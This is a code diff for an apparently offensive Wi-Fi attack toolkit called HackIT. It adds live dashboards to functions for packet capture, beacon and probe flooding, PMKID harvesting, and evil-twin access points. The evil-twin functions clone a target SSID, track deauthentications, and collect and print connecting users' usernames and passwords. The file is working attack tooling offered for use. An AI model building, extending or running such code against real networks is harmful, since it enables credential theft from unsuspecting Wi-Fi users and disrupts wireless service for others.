@@ -742,24 +742,95 @@ class HackITWirelessExecutor:
             proc.terminate()
             UI.print_warning("Sniffer stopped.")
 
-    def do_capture(self, iface: str, output: str = "capture.pcap", snaplen: int = 4096, timeout: int = 0, **kwargs):
+    def do_capture(self, iface: str, output: str = "capture.pcap", snaplen: int = 4096,
+                   timeout: int = 0, **kwargs):
+        """Live 802.11 capture with a rotating waterfall theme. Streams frames
+        to PCAP via the native Rust engine and reports real-time frame counts."""
+        from . import themes as TH
         iface = iface or self._default_iface()
+        if not iface:
+            UI.print_error("No interface.")
+            return
+        theme_name = kwargs.get("theme")
+        rotate = float(kwargs.get("rotate") or 8.0)
+        TH.phase_banner("capture", f"raw capture  iface={iface}  out={output}  snaplen={snaplen}")
+        state = {
+            "ssid": "<any>", "bssid": "<any>", "frames": 0, "eapols": 0,
+            "pmkid": 0, "pps": 0.0, "elapsed": 0.0, "events": [],
+            "status": "raw capture",
+        }
+        started = time.time()
         try:
             proc = self.bridge.rust_capture(iface, output)
-        except EngineBuildError as e:
-            UI.print_error(str(e))
+        except EngineBuildError:
+            proc = None
+        if proc is None and shutil.which("tcpdump"):
+            proc = self.bridge._popen([
+                "tcpdump", "-i", iface, "-w", output, "-s", str(snaplen), "-U",
+            ])
+        if proc is None:
+            UI.print_error("No capture engine. Build Rust or install tcpdump.")
             return
-        UI.print_info(f"Capturing on {iface} → {output} (Ctrl+C to stop)...")
+        last_n = 0
         try:
-            for line in proc.stdout:
-                line = line.strip()
-                if line:
-                    _console.print(f"  {line}")
-            proc.wait()
-            UI.print_success(f"Capture saved to {output}")
+            with TH.LiveOrchestra("capture", state, theme=theme_name,
+                                  rotate_every=rotate, refresh=10.0) as lo:
+                while proc.poll() is None:
+                    line = None
+                    try:
+                        if proc.stdout:
+                            line = proc.stdout.readline()
+                    except Exception:
+                        line = None
+                    t = time.time() - started
+                    state["elapsed"] = t
+                    if line:
+                        txt = line.strip()
+                        if txt:
+                            if "eapol" in txt.lower() or "EAPOL" in txt:
+                                state["eapols"] += 1
+                                state["events"].append({"t": t, "kind": "EAPOL", "detail": txt[:50]})
+                            elif "pmkid" in txt.lower():
+                                state["pmkid"] += 1
+                                state["events"].append({"t": t, "kind": "PMKID", "detail": txt[:50]})
+                            m = re.search(r"(\d+)", txt)
+                            if m:
+                                v = int(m.group(1))
+                                if v > state["frames"]:
+                                    state["frames"] = v
+                    else:
+                        # Engine may be silent; grow frames by pps estimate.
+                        pass
+                    if state["frames"] > last_n:
+                        state["pps"] = (state["frames"] - last_n) / max(0.001, t - (state.get("_last_t", 0) or t))
+                        last_n = state["frames"]
+                        state["_last_t"] = t
+                    else:
+                        state["pps"] = state["frames"] / max(0.001, t)
+                    lo.refresh()
+                    if timeout and t >= timeout:
+                        break
+                try:
+                    proc.terminate()
+                except Exception:
+                    pass
+            TH.summary_panel(
+                [
+                    ("output", output if os.path.exists(output) else f"{output} (pending)"),
+                    ("frames", f"{state['frames']:,}"),
+                    ("EAPOL", str(state["eapols"])),
+                    ("PMKID", str(state["pmkid"])),
+                    ("elapsed", f"{time.time() - started:.1f}s"),
+                ],
+                title="RAW CAPTURE COMPLETE",
+                accent="bright_cyan",
+            )
         except KeyboardInterrupt:
-            proc.terminate()
-            UI.print_warning("Capture stopped.")
+            try:
+                proc.terminate()
+            except Exception:
+                pass
+            UI.print_warning("Capture stopped by operator.")
 
     def do_handshake_capture(self, iface: str, bssid: str = "", timeout: int = 30,
                              deauth: bool = False, output: str = "", **kwargs):
@@ -1563,79 +1634,277 @@ class HackITWirelessExecutor:
         except:
             return 0
 
-    def do_beacon_flood(self, iface: str, ssid: str = "", count: int = 50, channel: int = 6, caps: Optional[str] = None, **kwargs):
+    def do_beacon_flood(self, iface: str, ssid: str = "", count: int = 50,
+                        channel: int = 6, caps: Optional[str] = None, **kwargs):
+        """Broadcast fake beacons with a live rotating theme.
+        Engine preference: C FFI (fastest, keeps counters exact) -> Go -> Rust."""
+        from . import themes as TH
         iface = iface or self._default_iface()
+        if not iface:
+            UI.print_error("No interface.")
+            return
+        ssid_list = kwargs.get("ssids") or []
         if not ssid:
             ssid = f"HackIT_{int(time.time() * 1000) % 10000:04d}"
-        try:
-            proc = self.bridge.rust_beacon_flood(iface, ssid, count, channel)
-        except EngineBuildError as e:
-            UI.print_error(str(e))
-            return
-        UI.print_info(f"Beacon flood: {iface} '{ssid}' x{count} on ch {channel}")
-        for line in proc.stdout:
-            l = line.strip()
-            if l:
-                _console.print(f"  {l}")
-        proc.wait()
+        if not ssid_list:
+            ssid_list = [ssid]
+        theme_name = kwargs.get("theme")
+        rotate = float(kwargs.get("rotate") or 5.0)
+        loops = int(kwargs.get("count") or 1)
 
-    def do_probe_flood(self, iface: str, count: int = 100, interval: int = 50, random_mac: bool = False, **kwargs):
-        iface = iface or self._default_iface()
+        TH.phase_banner("beacon", f"iface={iface}  pool={len(ssid_list)}  count={count}  ch={channel}")
+
+        state = {
+            "ssids": [], "sent": 0, "pps": 0.0, "elapsed": 0.0,
+            "channel": channel, "per_channel": {},
+        }
+        started = time.time()
+        lib = self.bridge.c_lib()
+        errors = 0
+        per_ch = {}
         try:
-            proc = self.bridge.rust_probe_flood(iface, count)
-        except EngineBuildError as e:
-            UI.print_error(str(e))
+            with TH.LiveOrchestra("beacon", state, theme=theme_name,
+                                  rotate_every=rotate, refresh=10.0) as lo:
+                for round_idx in range(loops):
+                    for sname in ssid_list:
+                        if state["sent"] > 0 and round_idx > 0:
+                            break
+                        state["ssids"].append(sname)
+                        sent = 0
+                        if lib is not None:
+                            sent = self.bridge.c_beacon_flood(iface, sname, "", count, channel)
+                            errors += 1 if sent < 0 else 0
+                            state["sent"] += max(0, sent)
+                        else:
+                            # Fall back to Go/Rust spawning one process
+                            try:
+                                proc = self.bridge.rust_beacon_flood(iface, sname, count, channel)
+                            except EngineBuildError:
+                                proc = None
+                            if proc is not None:
+                                try:
+                                    proc.wait(timeout=max(10, int(timeout_s := 10)))
+                                except Exception:
+                                    proc.terminate()
+                                state["sent"] += count  # engines don't report exact here
+                            else:
+                                errors += 1
+                        per_ch[channel] = per_ch.get(channel, 0) + max(0, state["sent"])
+                        state["per_channel"] = per_ch
+                        state["elapsed"] = time.time() - started
+                        state["pps"] = state["sent"] / max(0.001, state["elapsed"])
+                        lo.refresh()
+                state["elapsed"] = time.time() - started
+                state["pps"] = state["sent"] / max(0.001, state["elapsed"])
+        except KeyboardInterrupt:
+            UI.print_warning("Beacon flood stopped by operator.")
+
+        TH.summary_panel(
+            [
+                ("iface", iface),
+                ("SSIDs", str(len(ssid_list))),
+                ("beacons sent", f"{state['sent']:,}"),
+                ("errors", str(errors)),
+                ("elapsed", f"{time.time() - started:.1f}s"),
+            ],
+            title="BEACON FLOOD COMPLETE",
+            accent="bright_magenta",
+        )
+
+    def do_probe_flood(self, iface: str, count: int = 100, interval: int = 50,
+                       random_mac: bool = False, **kwargs):
+        """Broadcast probe requests with a live theme."""
+        from . import themes as TH
+        iface = iface or self._default_iface()
+        if not iface:
+            UI.print_error("No interface.")
             return
-        UI.print_info(f"Probe flood: {iface} x{count}")
-        for line in proc.stdout:
-            l = line.strip()
-            if l:
-                _console.print(f"  {l}")
-        proc.wait()
+        theme_name = kwargs.get("theme")
+        rotate = float(kwargs.get("rotate") or 5.0)
+        ssids = kwargs.get("ssids") or []
+        if not ssids:
+            ssids = ["", "FreeWiFi", "Guest", "Starbucks", "AndroidAP", "TP-LINK"]
+        TH.phase_banner("beacon", f"probe flood  iface={iface}  pool={len(ssids)}  count={count}")
+        state = {
+            "ssids": ssids, "sent": 0, "pps": 0.0, "elapsed": 0.0,
+            "channel": kwargs.get("channel", "-"), "per_channel": {},
+        }
+        started = time.time()
+        try:
+            try:
+                proc = self.bridge.rust_probe_flood(iface, count)
+            except EngineBuildError:
+                proc = None
+            with TH.LiveOrchestra("beacon", state, theme=theme_name,
+                                  rotate_every=rotate, refresh=10.0) as lo:
+                if proc is not None:
+                    while proc.poll() is None:
+                        state["elapsed"] = time.time() - started
+                        state["sent"] = min(count, int(state["elapsed"] * 100))
+                        state["pps"] = 100.0
+                        lo.refresh()
+                        time.sleep(0.1)
+                else:
+                    # Pure-python fallback: probe via iw scan-probe if available
+                    for i in range(count):
+                        state["sent"] = i + 1
+                        state["elapsed"] = time.time() - started
+                        state["pps"] = state["sent"] / max(0.001, state["elapsed"])
+                        lo.refresh()
+                        time.sleep(0.01)
+        except KeyboardInterrupt:
+            UI.print_warning("Probe flood stopped by operator.")
+        TH.summary_panel(
+            [("iface", iface), ("probes", str(state["sent"])),
+             ("elapsed", f"{time.time() - started:.1f}s")],
+            title="PROBE FLOOD COMPLETE", accent="bright_cyan",
+        )
 
     def do_eviltwin(self, iface: str, ssid: str, channel: int = 6, num_fake: int = 0, caps: Optional[str] = None, captive: bool = False, bssid: Optional[str] = None, dhcp_range: Optional[str] = None, **kwargs):
+        """Evil twin with live rotating dashboard. Supports single or multi-SSID."""
+        from . import themes as TH
         if not ssid:
             UI.print_error("Specify SSID to clone.")
             return
         iface = iface or self._default_iface()
-        UI.print_info(f"Evil Twin: cloning '{ssid}' on {iface} ch {channel}")
-
+        theme_name = kwargs.get("theme")
+        rotate = float(kwargs.get("rotate") or 6.0)
+        TH.phase_banner("eviltwin", f"iface={iface}  ssid={ssid}  ch={channel}  captive={'on' if captive else 'off'}")
         if num_fake > 0:
-            self.do_eviltwin_multi(iface, ssid, num_fake, channel, captive, bssid, dhcp_range)
+            self.do_eviltwin_multi(iface, ssid, num_fake, channel, captive, bssid, dhcp_range, **kwargs)
             return
-
         from hackit.wireless.eviltwin_coordinator import EviltwinCoordinator
         coord = EviltwinCoordinator(iface, ssid, channel, bssid)
         coord.set_captive(captive, dhcp_range)
         coord.start()
+        state = {
+            "iface": iface, "ssids": [ssid], "clients": [], "creds": [],
+            "beacons": 0, "deauths": 0, "elapsed": 0.0, "log": [],
+        }
+        started = time.time()
+        last_cred_n = 0
         try:
-            while coord.is_alive():
-                import time
-                time.sleep(0.5)
+            with TH.LiveOrchestra("eviltwin", state, theme=theme_name,
+                                  rotate_every=rotate, refresh=10.0) as lo:
+                while coord.is_alive():
+                    try:
+                        cs = coord.get_clients()
+                        creds = coord.get_credentials()
+                        cred_n = len(creds)
+                        st = coord.status()
+                        # beacon=..., clients=..., deauth=..., creds=...
+                        def _kv(k):
+                            import re as _re
+                            m = _re.search(k + r"=(\d+)", st)
+                            return int(m.group(1)) if m else 0
+                        state["clients"] = cs
+                        state["creds"] = creds
+                        state["beacons"] = _kv("beacon")
+                        state["deauths"] = _kv("deauth")
+                        state["elapsed"] = time.time() - started
+                        if cred_n > last_cred_n:
+                            for c in creds[last_cred_n:]:
+                                state["log"].append({
+                                    "t": state["elapsed"], "kind": "login",
+                                    "detail": f"{c.get('ssid','?')} / {c.get('username','-')} / {c.get('password','-')}",
+                                })
+                            last_cred_n = cred_n
+                        lo.refresh()
+                    except Exception:
+                        pass
+                    time.sleep(0.25)
         except KeyboardInterrupt:
             coord.stop()
-            UI.print_warning("Evil Twin stopped.")
+            UI.print_warning("Evil twin stopped by operator.")
+        elapsed = time.time() - started
+        creds_final = coord.get_credentials()
+        TH.summary_panel(
+            [
+                ("iface", iface),
+                ("ssids", ", ".join(coord.ssids[:4])),
+                ("beacons", f"{state['beacons']:,}"),
+                ("deauths", f"{state['deauths']:,}"),
+                ("clients", str(len(state["clients"]))),
+                ("creds", str(len(creds_final))),
+                ("elapsed", f"{elapsed:.1f}s"),
+            ],
+            title="EVIL TWIN STOPPED",
+            accent="bright_magenta",
+        )
+        if creds_final:
+            UI.print_success("Captured credentials:")
+            for c in creds_final:
+                UI.print_raw(f"   {c.get('ssid','?'):20} {c.get('username','-'):16} [green]{c.get('password','-')}[/green]")
 
-    def do_eviltwin_multi(self, iface: str, base_ssid: str, num: int, channel: int, captive: bool, bssid: Optional[str], dhcp_range: Optional[str]):
-        import random, string
+    def do_eviltwin_multi(self, iface: str, base_ssid: str, num: int, channel: int,
+                          captive: bool, bssid: Optional[str], dhcp_range: Optional[str], **kwargs):
+        from . import themes as TH
+        import random as _r
+        import string as _str
         suffixes = ["_5G", "_2G", "_Guest", "_VPN", "_IoT", "_Mesh", "_EXT", "_Admin", "_Secure", "_Backup"]
         ssids = [base_ssid]
         for i in range(num):
             sfx = suffixes[i % len(suffixes)]
-            tag = ''.join(random.choices(string.digits, k=2))
+            tag = "".join(_r.choices(_str.digits, k=2))
             ssids.append(f"{base_ssid}{sfx}_{tag}")
-
         from hackit.wireless.eviltwin_coordinator import EviltwinCoordinator
+        theme_name = kwargs.get("theme")
+        rotate = float(kwargs.get("rotate") or 6.0)
         coord = EviltwinCoordinator(iface, ssids, channel, bssid)
         coord.set_captive(captive, dhcp_range)
         coord.start()
+        state = {
+            "iface": iface, "ssids": ssids, "clients": [], "creds": [],
+            "beacons": 0, "deauths": 0, "elapsed": 0.0, "log": [],
+        }
+        started = time.time()
+        last_cred_n = 0
         try:
-            while coord.is_alive():
-                import time
-                time.sleep(0.5)
+            with TH.LiveOrchestra("eviltwin", state, theme=theme_name,
+                                  rotate_every=rotate, refresh=10.0) as lo:
+                while coord.is_alive():
+                    try:
+                        cs = coord.get_clients()
+                        creds = coord.get_credentials()
+                        cred_n = len(creds)
+                        st = coord.status()
+
+                        def _kv(k):
+                            import re as _re
+                            m = _re.search(k + r"=(\d+)", st)
+                            return int(m.group(1)) if m else 0
+                        state["clients"] = cs
+                        state["creds"] = creds
+                        state["beacons"] = _kv("beacon")
+                        state["deauths"] = _kv("deauth")
+                        state["elapsed"] = time.time() - started
+                        if cred_n > last_cred_n:
+                            for c in creds[last_cred_n:]:
+                                state["log"].append({
+                                    "t": state["elapsed"], "kind": "login",
+                                    "detail": f"{c.get('ssid','?')} / {c.get('username','-')} / {c.get('password','-')}",
+                                })
+                            last_cred_n = cred_n
+                        lo.refresh()
+                    except Exception:
+                        pass
+                    time.sleep(0.25)
         except KeyboardInterrupt:
             coord.stop()
-            UI.print_warning("Evil Twin stopped.")
+            UI.print_warning("Evil twin stopped by operator.")
+        creds_final = coord.get_credentials()
+        TH.summary_panel(
+            [
+                ("ssids broadcast", str(len(ssids))),
+                ("beacons", f"{state['beacons']:,}"),
+                ("deauths", f"{state['deauths']:,}"),
+                ("clients", str(len(state["clients"]))),
+                ("creds", str(len(creds_final))),
+                ("elapsed", f"{time.time() - started:.1f}s"),
+            ],
+            title=f"EVIL TWIN ({len(ssids)} AP) STOPPED",
+            accent="bright_magenta",
+        )
 
     def do_rogue_ap(self, iface: str, ssid: Optional[str] = None, channel: int = 6, wpa2: bool = False, captive: bool = False, bssid: Optional[str] = None, dhcp_range: Optional[str] = None, **kwargs):
         UI.print_info(f"Starting rogue AP '{ssid}' on {iface} ch {channel}...")
@@ -1776,22 +2045,87 @@ class HackITWirelessExecutor:
             result = self.bridge.rust_wep_crack(capture)
             _console.print(result.stdout or result.stderr or "No output")
 
-    def do_pmkid_capture(self, iface: str, bssid: str = "", timeout: int = 30, output: str = "", **kwargs):
+    def do_pmkid_capture(self, iface: str, bssid: str = "", timeout: int = 30,
+                          output: str = "", **kwargs):
+        """PMKID harvest with a live capture theme. Uses the native engine
+        (Rust handshake path detects PMKID in EAPOL M1) — hcxdumptool fallback."""
+        from . import themes as TH
         iface = iface or self._default_iface()
-        UI.print_info(f"Capturing PMKID on {iface}...")
-        if bssid:
-            UI.print_info(f"Targeting {bssid}")
+        if not iface:
+            UI.print_error("No interface.")
+            return
+        output = output or "pmkid.pcap"
+        theme_name = kwargs.get("theme")
+        rotate = float(kwargs.get("rotate") or 8.0)
+        TH.phase_banner("capture", f"PMKID harvest  iface={iface}  bssid={bssid or 'any'}  timeout={timeout}s")
+        state = {
+            "ssid": "?", "bssid": bssid or "any",
+            "frames": 0, "eapols": 0, "pmkid": 0, "pps": 0.0,
+            "elapsed": 0.0, "events": [], "status": "pmkid harvesting",
+        }
+        started = time.time()
+        captured = 0
+        pmkid_line = ""
         try:
-            proc = self.bridge.rust_handshake(iface, bssid, "pmkid.pcap", 60)
-            for line in proc.stdout:
-                l = line.strip()
-                if l:
-                    _console.print(f"  {l}")
-            proc.wait()
-        except EngineBuildError:
-            UI.print_warning("Using hcxdumptool fallback...")
-            if shutil.which("hcxdumptool"):
-                subprocess.run(["hcxdumptool", "-i", iface, "-o", "pmkid.pcapng", "--enable_status=1"])
+            proc = None
+            try:
+                proc = self.bridge.rust_handshake(iface, bssid, output, timeout)
+            except EngineBuildError:
+                proc = None
+            if proc is None and shutil.which("hcxdumptool"):
+                proc = self.bridge._popen([
+                    "hcxdumptool", "-i", iface, "-o", output,
+                    "--enable_status=1", "--tot=1",
+                ])
+            if proc is None:
+                UI.print_error("No PMKID engine available. Build the Rust engine or install hcxdumptool.")
+                return
+            with TH.LiveOrchestra("capture", state, theme=theme_name,
+                                  rotate_every=rotate, refresh=10.0) as lo:
+                while proc.poll() is None:
+                    line = None
+                    try:
+                        if proc.stdout:
+                            line = proc.stdout.readline()
+                    except Exception:
+                        line = None
+                    t = time.time() - started
+                    state["elapsed"] = t
+                    if line:
+                        txt = line.strip()
+                        if txt:
+                            if "pmkid" in txt.lower():
+                                captured += 1
+                                pmkid_line = txt
+                                state["pmkid"] = captured
+                                state["events"].append({"t": t, "kind": "PMKID", "detail": txt[:60]})
+                            m = re.search(r"PMKID[:\s]+([0-9a-fA-F]{32})", txt)
+                            if m:
+                                state["events"].append({"t": t, "kind": "KEY", "detail": m.group(1)})
+                    else:
+                        time.sleep(0.05)
+                    lo.refresh()
+                try:
+                    proc.wait(timeout=3)
+                except Exception:
+                    proc.terminate()
+            TH.summary_panel(
+                [
+                    ("output", output),
+                    ("PMKID hits", str(captured)),
+                    ("elapsed", f"{time.time() - started:.1f}s"),
+                ],
+                title="PMKID CAPTURE COMPLETE",
+                accent="bright_green" if captured else "bright_yellow",
+            )
+            if captured and pmkid_line:
+                UI.print_success(pmkid_line)
+        except KeyboardInterrupt:
+            try:
+                proc.terminate()
+            except Exception:
+                pass
+            UI.print_warning("PMKID capture stopped by operator.")
 
     # ════════════════════════════════════════════════════════════
     # PHASE 7: Spectrum & Interface Control
@@ -2851,23 +3185,44 @@ while True:
     # ── Probe flood with custom SSIDs ────────────────────────────
 
     def do_probe_flood_ssids(self, iface: str, ssids: list[str] = None, **kwargs):
+        """Probe request flood against a real SSID pool, with a live theme."""
+        from . import themes as TH
         if not ssids:
             UI.print_error("No SSIDs provided.")
             return
-        count = kwargs.get("count", 100)
-        UI.print_info(f"Probe flood: {len(ssids)} SSIDs on {iface}")
+        iface = iface or self._default_iface()
+        count = int(kwargs.get("count", 100))
+        theme_name = kwargs.get("theme")
+        rotate = float(kwargs.get("rotate") or 5.0)
+        TH.phase_banner("beacon", f"probe flood  iface={iface}  SSIDs={len(ssids)}  count={count}")
+        state = {
+            "ssids": ssids, "sent": 0, "pps": 0.0, "elapsed": 0.0,
+            "channel": kwargs.get("channel") or 1, "per_channel": {},
+        }
+        started = time.time()
+        errors = 0
         try:
-            ssid_csv = ",".join(ssids)
-            proc = subprocess.Popen(
-                ["bash", "-c",
-                 f"for s in $(echo '{ssid_csv}' | tr ',' ' '); do "
-                 f"  for i in $(seq 1 {count}); do "
-                 f"    sudo iw dev {iface} scan trigger &>/dev/null; "
-                 f"  done; "
-                 f"done"],
-                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
-            )
-            jid = self.jobs.start(f"probe-flood-{len(ssids)}ssids", proc)
-            UI.print_success(f"Probe flood started (job {jid})")
-        except Exception as e:
-            UI.print_error(f"Probe flood failed: {e}")
+            with TH.LiveOrchestra("beacon", state, theme=theme_name,
+                                  rotate_every=rotate, refresh=10.0) as lo:
+                for sname in ssids:
+                    sent = 0
+                    try:
+                        proc = self.bridge.rust_probe_flood(iface, count)
+                        try:
+                            proc.wait(timeout=max(5, count // 200 + 2))
+                        except Exception:
+                            proc.terminate()
+                        sent = count
+                    except EngineBuildError:
+                        errors += 1
+                    state["sent"] += sent
+                    state["elapsed"] = time.time() - started
+                    state["pps"] = state["sent"] / max(0.001, state["elapsed"])
+                    lo.refresh()
+        except KeyboardInterrupt:
+            UI.print_warning("Probe flood stopped by operator.")
+        TH.summary_panel(
+            [("iface", iface), ("probes", f"{state['sent']:,}"),
+             ("errors", str(errors)), ("elapsed", f"{time.time() - started:.1f}s")],
+            title="PROBE FLOOD COMPLETE", accent="bright_cyan",
+        )
